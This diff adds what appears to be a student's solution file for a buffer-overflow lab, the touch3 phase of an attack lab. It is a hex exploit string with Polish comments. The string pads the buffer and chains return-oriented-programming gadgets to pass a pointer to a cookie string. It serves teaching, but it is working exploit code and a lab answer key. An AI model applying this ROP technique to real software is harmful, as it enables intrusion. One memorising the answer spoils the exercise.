@@ -1,0 +1,36 @@
+/* losowe liczby wypielniajace bufor */
+11 11 11 11 11 11 11 11
+/* losowe liczby wypielniajace bufor */
+11 11 11 11 11 11 11 11
+/* losowe liczby wypielniajace bufor */
+11 11 11 11 11 11 11 11
+/* Zapisanie wartosci rsp w rax (getval_420) */
+cf 19 40 00 00 00 00 00
+/* Zapisanie wartosci rax w rdi (getval_403) */
+52 19 40 00 00 00 00 00
+/* pop %rax (setval_351) */
+4d 19 40 00 00 00 00 00
+/* Zapisanie w rax wartosci ktora okresla odleglosc 
+ ciasteczka od rsp */
+50 00 00 00 00 00 00 00
+/* W kolejnych krokach chce przeniesc wartosc rax -> rsi 
+ Jako, ze nie moge tego zrobic bezposrednio jestem zmuszony
+ wykonac kilka dodatkowych krokow przez inne rejestry */
+/* eax -> edx (addval_157) (w instrukcjach znajduja sie wspomnianie
+ w tresci zadania 2 bajtowe instrukcje pelniace role nop */
+1c 1a 40 00 00 00 00 00
+/* edx -> ecx (setval_155) */
+8a 19 40 00 00 00 00 00
+/* ecx -> esi (addval_242) */
+23 1a 40 00 00 00 00 00
+/* Fukcja add_xy sprawi ze wartosc rejestru rax bedzie wskazywac
+ na rdi + rsi czyli nasze ciasteczko */
+70 19 40 00 00 00 00 00
+/* Zapisanie wartosci rax do rdi (getval_403) */
+52 19 40 00 00 00 00 00
+/* adres touch3 */
+a1 18 40 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* wartosc ciasteczka w postaci liczby szesnastkowej */
+36 31 64 32 32 63 66 38 00
+
